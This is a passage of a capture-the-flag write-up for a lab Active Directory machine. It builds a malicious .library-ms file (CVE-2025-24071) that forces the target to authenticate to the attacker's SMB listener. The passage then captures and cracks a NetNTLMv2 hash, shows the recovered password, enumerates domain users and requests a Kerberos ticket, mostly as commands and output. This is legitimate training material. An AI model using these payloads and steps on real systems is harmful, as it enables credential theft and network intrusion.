+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;http://hire.nanocorp.htb&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;btn tm-btn-gray&#34;</span><span class=p>&gt;</span>Apply Now<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span></span></span></code></pre></td></tr></table></div></div></div><a href=/res/20260515171521.png class="popup img-link"><img src=/res/20260515171521.png alt=469></a><h3 id=key-finding id=key-finding><span class=me-2>Key Finding</span>
+<a href=#key-finding class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><blockquote><p>The HTML source code explicitly points to a new virtual host / subdomain:
+We will update our local <code>/etc/hosts</code> file to include this new subdomain for further targeted web application testing.</p></blockquote><h2 id=local-dns-configuration-etchosts id=local-dns-configuration-etchosts><span class=me-2>Local DNS Configuration (<code>/etc/hosts</code>)</span>
+<a href=#local-dns-configuration-etchosts class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>To ensure proper routing for the newly discovered virtual hosts, we update our local <code>/etc/hosts</code> file. In addition to the main domain and the hiring subdomain, we also append the Domain Controller hostname (<code>dc01.nanocorp.htb</code>) identified earlier from the Nmap SSL certificate disclosure and LDAP signatures.</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;10.129.231.124  nanocorp.htb dc01.nanocorp.htb hire.nanocorp.htb&#34;</span> <span class=p>|</span> sudo tee -a /etc/hosts</span></span></code></pre></td></tr></table></div></div></div><blockquote><p>This mapping allows us to interact directly with the target services using their correct Domain Name System (DNS) context, which is mandatory for proper Virtual Host routing on port 80 and subsequent Kerberos authentication phases.</p></blockquote><h2 id=active-directory-time-synchronization-chrony id=active-directory-time-synchronization-chrony><span class=me-2>Active Directory Time Synchronization (<code>chrony</code>)</span>
+<a href=#active-directory-time-synchronization-chrony class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Active Directory environments heavily rely on Kerberos for authentication, which enforces a strict maximum clock skew (typically 5 minutes) between the client and the Domain Controller. To prevent authentication failures during our upcoming exploits, we dynamically add the Domain Controller as an NTP source using <code>chronyc</code> :</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> ╭─nabiasa@nabiasa in ~/Desktop/AD
+</span></span><span class=line><span class=cl>❯ sudo chronyc add server 10.129.231.124 iburst
+</span></span><span class=line><span class=cl><span class=m>200</span> OK
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> ╭─nabiasa@nabiasa in ~/Desktop/AD via
+</span></span><span class=line><span class=cl> ╰─λ chronyc sources
+</span></span><span class=line><span class=cl>MS Name/IP address         Stratum Poll Reach LastRx Last <span class=nv>sample</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================================</span>
+</span></span><span class=line><span class=cl>^* ntp.psu.ac.th                 <span class=m>2</span>  <span class=m>10</span>   <span class=m>377</span>   <span class=m>496</span>  -1237us<span class=o>[</span>-1118us<span class=o>]</span> +/-   20ms
+</span></span><span class=line><span class=cl>^- 2a0d:5600:21:25:0:2:0:5       <span class=m>2</span>  <span class=m>10</span>   <span class=m>377</span>   <span class=m>414</span>   -239us<span class=o>[</span> -239us<span class=o>]</span> +/-   83ms
+</span></span><span class=line><span class=cl>^+ 202.29.58.130                 <span class=m>2</span>  <span class=m>10</span>   <span class=m>377</span>   <span class=m>382</span>  +1976us<span class=o>[</span>+1976us<span class=o>]</span> +/-   36ms
+</span></span><span class=line><span class=cl>^+ ntp.kasetsart.org             <span class=m>2</span>  <span class=m>10</span>   <span class=m>377</span>   41m   -228us<span class=o>[</span>  -66us<span class=o>]</span> +/-   40ms
+</span></span><span class=line><span class=cl>^? nanocorp.htb                  <span class=m>1</span>   <span class=m>6</span>    <span class=m>17</span>    <span class=m>29</span>  -25445s<span class=o>[</span>-25445s<span class=o>]</span> +/-  10.1s
+</span></span><span class=line><span class=cl> ╭─nabiasa@nabiasa in ~/Desktop/AD via
+</span></span><span class=line><span class=cl>❯ sudo chronyd -q <span class=s1>&#39;server 10.129.231.124 iburst&#39;</span>
+</span></span><span class=line><span class=cl><span class=m>200</span> OK</span></span></code></pre></td></tr></table></div></div></div><h2 id=initial-foothold--hash-coercion-cve-2025-24071 id=initial-foothold--hash-coercion-cve-2025-24071><span class=me-2>Initial Foothold & Hash Coercion (CVE-2025-24071)</span>
+<a href=#initial-foothold--hash-coercion-cve-2025-24071 class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>To force an outbound authentication attempt from the target server, we exploit <strong>CVE-2025-24071</strong>. This vulnerability allows an attacker to trigger an automatic SMB connection when the Windows Explorer engine parses a malicious library description file (<code>.library-ms</code>).</p><h3 id=crafting-the-malicious-library-file id=crafting-the-malicious-library-file><span class=me-2>Crafting the Malicious Library File</span>
+<a href=#crafting-the-malicious-library-file class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We create a custom Windows Library file named <code>test.library-ms</code>. Within the <code>&lt;simpleLocation></code> tag, we specify a remote UNC path pointing directly to our listening attack machine (<code>10.10.14.30</code>):</p><p><a href=https://github.com/0x6rss/CVE-2025-24071_PoC>https://github.com/0x6rss/CVE-2025-24071_PoC</a></p><div class=code-block><div class=code-header><span data-label-text=XML><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>       <span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+</span></span><span class=line><span class=cl>       <span class=nt>&lt;libraryDescription</span> <span class=na>xmlns=</span><span class=s>&#34;http://schemas.microsoft.com/windows/2009/library&#34;</span><span class=nt>&gt;</span>
+</span></span><span class=line><span class=cl>         <span class=nt>&lt;searchConnectorDescriptionList&gt;</span>
+</span></span><span class=line><span class=cl>           <span class=nt>&lt;searchConnectorDescription&gt;</span>
+</span></span><span class=line><span class=cl>             <span class=nt>&lt;isDefaultSaveLocation&gt;</span>true<span class=nt>&lt;/isDefaultSaveLocation&gt;</span>
+</span></span><span class=line><span class=cl>             <span class=nt>&lt;isSupported&gt;</span>true<span class=nt>&lt;/isSupported&gt;</span>
+</span></span><span class=line><span class=cl>             <span class=nt>&lt;simpleLocation&gt;</span>
+</span></span><span class=line><span class=cl>               <span class=nt>&lt;url&gt;</span>\\10.10.14.30\test<span class=nt>&lt;/url&gt;</span>
+</span></span><span class=line><span class=cl>             <span class=nt>&lt;/simpleLocation&gt;</span>
+</span></span><span class=line><span class=cl>           <span class=nt>&lt;/searchConnectorDescription&gt;</span>
+</span></span><span class=line><span class=cl>         <span class=nt>&lt;/searchConnectorDescriptionList&gt;</span>
+</span></span><span class=line><span class=cl>       <span class=nt>&lt;/libraryDescription&gt;</span></span></span></code></pre></td></tr></table></div></div></div><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>zip exploit.zip test.library-ms</span></span></code></pre></td></tr></table></div></div></div><blockquote class=prompt-info><p><a href=http://hire.nanocorp.htb/success.php>http://hire.nanocorp.htb/success.php</a></p></blockquote><a href=/res/20260515172433.png class="popup img-link"><img src=/res/20260515172433.png alt></a><h2 id=hash-capture-via-responder id=hash-capture-via-responder><span class=me-2>Hash Capture via Responder</span>
+<a href=#hash-capture-via-responder class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>With our malicious ZIP file ready, we submit it to the hiring portal at <code>[http://hire.nanocorp.htb/success.php](http://hire.nanocorp.htb/success.php)</code>. Simultaneously, we set up a local SMB listener to catch the inbound authentication request triggered by the file.</p><h3 id=starting-the-listener id=starting-the-listener><span class=me-2>Starting the Listener</span>
+<a href=#starting-the-listener class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We launch <code>responder</code> on our VPN interface (<code>tun0</code>) with active analysis and verbosity flags enabled:</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> sudo responder -I tun0 -dwv</span></span></code></pre></td></tr></table></div></div></div><h3 id=capture-output id=capture-output><span class=me-2>Capture Output</span>
+<a href=#capture-output class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Once the web application processes our uploaded archive, the backend server initiates a connection to our SMB share using the credentials of the service account:</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>SMB<span class=o>]</span> NTLMv2-SSP Client   : 10.129.231.124
+</span></span><span class=line><span class=cl><span class=o>[</span>SMB<span class=o>]</span> NTLMv2-SSP Username : NANOCORP<span class=se>\w</span>eb_svc
+</span></span><span class=line><span class=cl><span class=o>[</span>SMB<span class=o>]</span> NTLMv2-SSP Hash     : web_svc::NANOCORP:610cefc3533fa8c1:0E911CD05F08617DA820A952DCBB7D54:01010000000000000094016532E5DC01C02EF5DC0B55E27F00000000020008004A004A003100410001001E00570049004E002D0049004B003400560057003100390051004A004F004C0004003400570049004E002D0049004B003400560057003100390051004A004F004C002E004A004A00310041002E004C004F00430041004C00030014004A004A00310041002E004C004F00430041004C00050014004A004A00310041002E004C004F00430041004C00070008000094016532E5DC010600040002000000080030003000000000000000000000000020000036AC74736BEC2010DF8CAA880F347CF58E9B4CC5E3DB2E1106AA610BC8C400F90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330030000000000000000000</span></span></code></pre></td></tr></table></div></div></div><h2 id=offline-password-cracking-hashcat id=offline-password-cracking-hashcat><span class=me-2>Offline Password Cracking (<code>hashcat</code>)</span>
+<a href=#offline-password-cracking-hashcat class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We attempt to recover the plaintext password of the compromised <code>web_svc</code> account. Since the captured hash is a NetNTLMv2 challenge-response, we target the hash mode <code>5600</code> using a standard dictionary attack against the <code>rockyou.txt</code> wordlist:</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> ╭─nabiasa@nabiasa in ~/Desktop/AD
+</span></span><span class=line><span class=cl> ╰─λ hashcat -m <span class=m>5600</span> -a <span class=m>0</span> hash.txt rockyou.txt
+</span></span><span class=line><span class=cl>hashcat <span class=o>(</span>v7.1.2<span class=o>)</span> starting
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/sys/class/hwmon/hwmon2/temp1_input: No such file or directory
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OpenCL API <span class=o>(</span>OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG<span class=o>)</span> - Platform <span class=c1>#1 [The pocl project]</span>
+</span></span><span class=line><span class=cl><span class=o>======================================================================================================================================</span>
+</span></span><span class=line><span class=cl>* Device <span class=c1>#01: cpu-penryn-Intel(R) Core(TM)2 Duo CPU     P8600  @ 2.40GHz, 1453/2907 MB (1453 MB allocatable), 2MCU</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Minimum password length supported by kernel: <span class=m>0</span>
+</span></span><span class=line><span class=cl>Maximum password length supported by kernel: <span class=m>256</span>
+</span></span><span class=line><span class=cl>Minimum salt length supported by kernel: <span class=m>0</span>
+</span></span><span class=line><span class=cl>Maximum salt length supported by kernel: <span class=m>256</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Hashes: <span class=m>1</span> digests<span class=p>;</span> <span class=m>1</span> unique digests, <span class=m>1</span> unique salts
+</span></span><span class=line><span class=cl>Bitmaps: <span class=m>16</span> bits, <span class=m>65536</span> entries, 0x0000ffff mask, <span class=m>262144</span> bytes, 5/13 rotates
+</span></span><span class=line><span class=cl>Rules: <span class=m>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Optimizers applied:
+</span></span><span class=line><span class=cl>* Zero-Byte
+</span></span><span class=line><span class=cl>* Not-Iterated
+</span></span><span class=line><span class=cl>* Single-Hash
+</span></span><span class=line><span class=cl>* Single-Salt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>ATTENTION! Pure <span class=o>(</span>unoptimized<span class=o>)</span> backend kernels selected.
+</span></span><span class=line><span class=cl>Pure kernels can crack longer passwords, but drastically reduce performance.
+</span></span><span class=line><span class=cl>If you want to switch to optimized kernels, append -O to your commandline.
+</span></span><span class=line><span class=cl>See the above message to find out about the exact limits.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Watchdog: Temperature abort trigger <span class=nb>set</span> to 90c
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Host memory allocated <span class=k>for</span> this attack: <span class=m>512</span> MB <span class=o>(</span><span class=m>970</span> MB free<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Dictionary cache built:
+</span></span><span class=line><span class=cl>* Filename..: rockyou.txt
+</span></span><span class=line><span class=cl>* Passwords.: <span class=m>14344391</span>
+</span></span><span class=line><span class=cl>* Bytes.....: <span class=m>139921497</span>
+</span></span><span class=line><span class=cl>* Keyspace..: <span class=m>14344384</span>
+</span></span><span class=line><span class=cl>* Runtime...: <span class=m>2</span> secs
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>WEB_SVC::NANOCORP:09efb65cf49607c8:c634dcb18d0f9e3ad04d41ed331e82c1:01010000000000000094016532e5dc0121a9d65a0916558300000000020008004a004a003100410001001e00570049004e002d0049004b003400560057003100390051004a004f004c0004003400570049004e002d0049004b003400560057003100390051004a004f004c002e004a004a00310041002e004c004f00430041004c00030014004a004a00310041002e004c004f00430041004c00050014004a004a00310041002e004c004f00430041004c00070008000094016532e5dc010600040002000000080030003000000000000000000000000020000036ac74736bec2010df8caa880f347cf58e9b4cc5e3db2e1106aa610bc8c400f90a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330030000000000000000000:dksehdgh712!@#
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Session..........: hashcat
+</span></span><span class=line><span class=cl>Status...........: Cracked
+</span></span><span class=line><span class=cl>Hash.Mode........: <span class=m>5600</span> <span class=o>(</span>NetNTLMv2<span class=o>)</span>
+</span></span><span class=line><span class=cl>Hash.Target......: WEB_SVC::NANOCORP:09efb65cf49607c8:c634dcb18d0f9e3a...000000
+</span></span><span class=line><span class=cl>Time.Started.....: Sat May <span class=m>16</span> 12:52:16 <span class=m>2026</span> <span class=o>(</span><span class=m>5</span> secs<span class=o>)</span>
+</span></span><span class=line><span class=cl>Time.Estimated...: Sat May <span class=m>16</span> 12:52:21 <span class=m>2026</span> <span class=o>(</span><span class=m>0</span> secs<span class=o>)</span>
+</span></span><span class=line><span class=cl>Kernel.Feature...: Pure Kernel <span class=o>(</span>password length 0-256 bytes<span class=o>)</span>
+</span></span><span class=line><span class=cl>Guess.Base.......: File <span class=o>(</span>rockyou.txt<span class=o>)</span>
+</span></span><span class=line><span class=cl>Guess.Queue......: 1/1 <span class=o>(</span>100.00%<span class=o>)</span>
+</span></span><span class=line><span class=cl>Speed.#01........:   379.8 kH/s <span class=o>(</span>3.86ms<span class=o>)</span> @ Accel:1024 Loops:1 Thr:1 Vec:4
+</span></span><span class=line><span class=cl>Recovered........: 1/1 <span class=o>(</span>100.00%<span class=o>)</span> Digests <span class=o>(</span>total<span class=o>)</span>, 1/1 <span class=o>(</span>100.00%<span class=o>)</span> Digests <span class=o>(</span>new<span class=o>)</span>
+</span></span><span class=line><span class=cl>Progress.........: 1855488/14344384 <span class=o>(</span>12.94%<span class=o>)</span>
+</span></span><span class=line><span class=cl>Rejected.........: 0/1855488 <span class=o>(</span>0.00%<span class=o>)</span>
+</span></span><span class=line><span class=cl>Restore.Point....: 1853440/14344384 <span class=o>(</span>12.92%<span class=o>)</span>
+</span></span><span class=line><span class=cl>Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span class=line><span class=cl>Candidate.Engine.: Device Generator
+</span></span><span class=line><span class=cl>Candidates.#01...: dobson5499 -&gt; djcward
+</span></span><span class=line><span class=cl>Hardware.Mon.#01.: Util: 87%
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Started: Sat May <span class=m>16</span> 12:52:11 <span class=m>2026</span>
+</span></span><span class=line><span class=cl>Stopped: Sat May <span class=m>16</span> 12:52:23 <span class=m>2026</span></span></span></code></pre></td></tr></table></div></div></div><h3 id=cracking-output id=cracking-output><span class=me-2>Cracking Output</span>
+<a href=#cracking-output class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The hash is successfully cracked offline:</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>WEB_SVC::NANOCORP:09efb65cf49607c8:c634dcb18d0f9e3ad04d41ed331e82c1:01010000000000000094016532e5dc0121a9d65a0916558300000000020008004a004a003100410001001e00570049004e002d0049004b003400560057003100390051004a004f004c0004003400570049004e002d0049004b003400560057003100390051004a004f004c002e004a004a00310041002e004c004f00430041004c00030014004a004a00310041002e004c004f00430041004c00050014004a004a00310041002e004c004f00430041004c00070008000094016532e5dc010600040002000000080030003000000000000000000000000020000036ac74736bec2010df8caa880f347cf58e9b4cc5e3db2e1106aa610bc8c400f90a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330030000000000000000000:dksehdgh712!@#
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Session..........: hashcat
+</span></span><span class=line><span class=cl>Status...........: Cracked
+</span></span><span class=line><span class=cl>Hash.Mode........: <span class=m>5600</span> <span class=o>(</span>NetNTLMv2<span class=o>)</span></span></span></code></pre></td></tr></table></div></div></div><p>We now have valid domain credentials for the initial foothold account:</p><ul><li><strong>Username:</strong> <code>web_svc</code></li><li><strong>Password:</strong> <code>dksehdgh712!@#</code>
+Here is the technical, concise write-up section in English for the LDAP domain enumeration:</li></ul><h2 id=active-directory-ldap-enumeration-netexec id=active-directory-ldap-enumeration-netexec><span class=me-2>Active Directory LDAP Enumeration (<code>NetExec</code>)</span>
+<a href=#active-directory-ldap-enumeration-netexec class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Using our newly acquired domain credentials, we perform an LDAP query using <strong>NetExec</strong> (<code>nxc</code>) to enumerate the domain users and gather initial directory information:</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> ╭─nabiasa@nabiasa in ~/Desktop/AD
+</span></span><span class=line><span class=cl>✦ ❯ nxc ldap 10.129.243.199 -u <span class=s1>&#39;web_svc&#39;</span> -p <span class=s1>&#39;dksehdgh712!@#&#39;</span> --users
+</span></span><span class=line><span class=cl>LDAP        10.129.243.199  <span class=m>389</span>    DC01             <span class=o>[</span>*<span class=o>]</span> Windows Server <span class=m>2022</span> Build <span class=m>20348</span> <span class=o>(</span>name:DC01<span class=o>)</span> <span class=o>(</span>domain:nanocorp.htb<span class=o>)</span> <span class=o>(</span>signing:None<span class=o>)</span> <span class=o>(</span>channel binding:No TLS cert<span class=o>)</span>
+</span></span><span class=line><span class=cl>LDAP        10.129.243.199  <span class=m>389</span>    DC01             <span class=o>[</span>+<span class=o>]</span> nanocorp.htb<span class=se>\w</span>eb_svc:dksehdgh712!@#
+</span></span><span class=line><span class=cl>LDAP        10.129.243.199  <span class=m>389</span>    DC01             <span class=o>[</span>*<span class=o>]</span> Enumerated <span class=m>5</span> domain users: nanocorp.htb
+</span></span><span class=line><span class=cl>LDAP        10.129.243.199  <span class=m>389</span>    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-
+</span></span><span class=line><span class=cl>LDAP        10.129.243.199  <span class=m>389</span>    DC01             Administrator                 2025-04-10 06:00:49 <span class=m>0</span>        Built-in account <span class=k>for</span> administering the computer/domain
+</span></span><span class=line><span class=cl>LDAP        10.129.243.199  <span class=m>389</span>    DC01             Guest                         &lt;never&gt;             <span class=m>0</span>        Built-in account <span class=k>for</span> guest access to the computer/domain
+</span></span><span class=line><span class=cl>LDAP        10.129.243.199  <span class=m>389</span>    DC01             krbtgt                        2025-04-03 08:38:45 <span class=m>0</span>        Key Distribution Center Service Account
+</span></span><span class=line><span class=cl>LDAP        10.129.243.199  <span class=m>389</span>    DC01             web_svc                       2025-04-10 05:59:38 <span class=m>0</span>
+</span></span><span class=line><span class=cl>LDAP        10.129.243.199  <span class=m>389</span>    DC01             monitoring_svc                2026-05-16 04:23:55 <span class=m>0</span></span></span></code></pre></td></tr></table></div></div></div><blockquote><p>Notably, we identify a specific service account named <strong><code>monitoring_svc</code></strong> providing a potential high-value target for lateral movement or privilege escalation.</p></blockquote><h2 id=kerberos-authentication--tgt-retrieval-gettgt id=kerberos-authentication--tgt-retrieval-gettgt><span class=me-2>Kerberos Authentication & TGT Retrieval (<code>getTGT</code>)</span>
+<a href=#kerberos-authentication--tgt-retrieval-gettgt class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>With valid domain credentials and our system clock successfully synchronized with the Domain Controller, we request a Kerberos Ticket Granting Ticket (TGT) for the <code>web_svc</code> service account. We utilize Impacket&rsquo;s <code>getTGT.py</code> tool to perform the AS-REQ request directly against the Domain Controller:</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> ╭─nabiasa@nabiasa in ~/Desktop/AD
+</span></span><span class=line><span class=cl> ╰─λ getTGT.py -dc-ip 10.129.231.124 NANOCORP.HTB/web_svc:<span class=s1>&#39;dksehdgh712!@#&#39;</span>
+</span></span><span class=line><span class=cl>Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving ticket in web_svc.ccache</span></span></code></pre></td></tr></table></div></div></div><h3 id=key-outcome id=key-outcome><span class=me-2>Key Outcome</span>
+<a href=#key-outcome class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><blockquote><p>The Domain Controller&rsquo;s Key Distribution Center (KDC) validates our credentials and returns a valid TGT. The ticket is successfully saved locally as <strong><code>web_svc.ccache</code></strong>, allowing us to authenticate to other Kerberos-enabled domain services via pass-the-ticket (PtT) without needing to supply the plaintext password again.</p></blockquote><h2 id=injecting-the-kerberos-ticket-krb5ccname id=injecting-the-kerberos-ticket-krb5ccname><span class=me-2>Injecting the Kerberos Ticket (<code>KRB5CCNAME</code>)</span>
+<a href=#injecting-the-kerberos-ticket-krb5ccname class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>To utilize our newly acquired Ticket Granting Ticket (TGT) with Impacket tools and other network utilities, we must load it into our current terminal session&rsquo;s memory. This is done by exporting the path of our <code>.ccache</code> file to the <code>KRB5CCNAME</code> environment variable:</p><h3 id=export-krb5ccname id=export-krb5ccname><span class=me-2>Export KRB5CCNAME</span>
+<a href=#export-krb5ccname class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
